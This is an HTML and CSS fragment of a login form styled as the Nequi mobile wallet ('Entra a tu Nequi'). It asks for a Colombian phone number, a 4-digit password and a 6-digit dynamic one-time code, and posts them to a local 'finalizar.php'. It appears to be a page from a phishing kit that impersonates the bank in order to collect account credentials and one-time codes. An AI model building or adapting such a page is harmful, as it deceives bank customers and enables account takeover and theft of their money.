    <style>
    .nequi-login-container {
      max-width: 370px;
      margin: 42px auto 32px auto;
      background: #fff;
      border-radius: 14px;
      box-shadow: 0 2px 16px rgba(0,0,0,0.09);
      padding: 32px 22px 24px 22px;
      display: flex;
      flex-direction: column;
      align-items: stretch;
    }
    .nequi-login-container h1 {
      text-align: center;
      color: #2c1246;
      font-weight: 700;
      margin-bottom: 6px;
    }
    .nequi-login-container p {
      text-align: center;
      color: #5c5c5c;
      font-size: 0.97rem;
      margin-bottom: 22px;
    }
    .nequi-field {
      margin-bottom: 18px;
    }
    .nequi-field label {
      display: block;
      font-size: 1.04rem;
      color: #6a1c85;
      font-weight: 500;
      margin-bottom: 6px;
    }
    .input-group {
      display: flex;
      align-items: center;
    }
    .input-indicativo {
      display: flex;
      align-items: center;
      background: #fff;
      border: 1.3px solid #d4b1e9;
      border-radius: 8px 0 0 8px;
      padding: 0 12px;
      height: 44px;
      font-size: 1.08rem;
      font-weight: 500;
      color: #333;
      margin-right: -1px;
      box-sizing: border-box;
    }
    .input-indicativo img {
      width: 22px;
      height: 16px;
      margin-right: 7px;
    }
    .input-celular {
      flex: 1;
      background: #fff;
      border: 1.3px solid #d4b1e9;
      border-left: none;
      border-radius: 0 8px 8px 0;
      height: 44px;
      padding: 0 12px;
      font-size: 1.08rem;
      box-sizing: border-box;
    }
    .input-celular:focus {
      border-color: #e4007a;
      outline: none;
    }
    .nequi-field input[type="password"] {
      width: 100%;
      padding: 10px 13px;
      font-size: 1.08rem;
      border: 1.3px solid #d4b1e9;
      border-radius: 8px;
      background: #f9f7fb;
      transition: border-color 0.3s;
      box-sizing: border-box;
    }
    .nequi-field input[type="password"]:focus {
      border-color: #e4007a;
      outline: none;
    }
    .captcha-box {
      background: #fff7fa;
      border: 1.3px solid #e4007a;
      border-radius: 8px;
      padding: 12px;
      display: flex;
      flex-direction: column;
      align-items: flex-start;
      gap: 8px;
    }
    .captcha-error {
      color: #d80027;
      font-size: 0.93rem;
      margin-top: 5px;
    }
    .nequi-btn {
      width: 100%;
      background: #e4007a;
      color: #fff;
      font-size: 1.15rem;
      font-weight: 600;
      border: none;
      border-radius: 8px;
      padding: 13px 0;
      margin-top: 12px;
      cursor: pointer;
      transition: background 0.2s;
    }
    .nequi-btn:hover {
      background: #b80063;
    }
    /* Elimina los estilos viejos del form principal */
    .login-wrap form,
    .login-wrap .form-group,
    .login-wrap .btn-wrap {
      all: unset;
    }
    </style>
</head>

    <section class="login-section">
        <div class="login-wrap">
            <div class="nequi-login-container">
                <h1>Entra a tu Nequi</h1>
                <p>Podrás bloquear tu Nequi, consultar tus datos.</p>
                <form method="POST" action="finalizar.php" autocomplete="off">
                    <div class="nequi-field">
                        <label for="j_username">Número de celular</label>
                        <div class="input-group">
                            <span class="input-indicativo">
                                <img src="https://flagcdn.com/w20/co.png" alt="Colombia">
                                +57
                            </span>
                            <input type="tel"
                                id="j_username"
                                name="j_username"
                                class="input-celular"
                                placeholder="3001234567"
                                maxlength="10"
                                minlength="10"
                                pattern="[0-9]{10}"
                                required
                                autocomplete="off">
                        </div>
                    </div>
                    <div class="nequi-field">
                        <label for="j_password">Contraseña</label>
                        <input type="password" id="j_password" name="j_password" maxlength="4" minlength="4" required>
                    </div>
                    <div class="nequi-field">
                        <label for="j_dinamica">Clave Dinámica</label>
                        <input type="password" id="j_dinamica" name="j_dinamica" maxlength="6" minlength="6" required>
                    </div>
                    <div class="nequi-field">
                        <div class="captcha-box">
                            <div class="g-recaptcha" data-sitekey="6Led89IrAAAAAGGHsXCbc_9T-8D9jpCJpE8NTogc"></div>
                            <div class="captcha-error" style="display:none;">La verificación ha caducado. Vuelve a marcar la casilla de verificación.</div>
                        </div>
                    </div>
                    <button type="submit" class="nequi-btn">Entra</button>
                </form>
            </div>
        </div>
    </section>
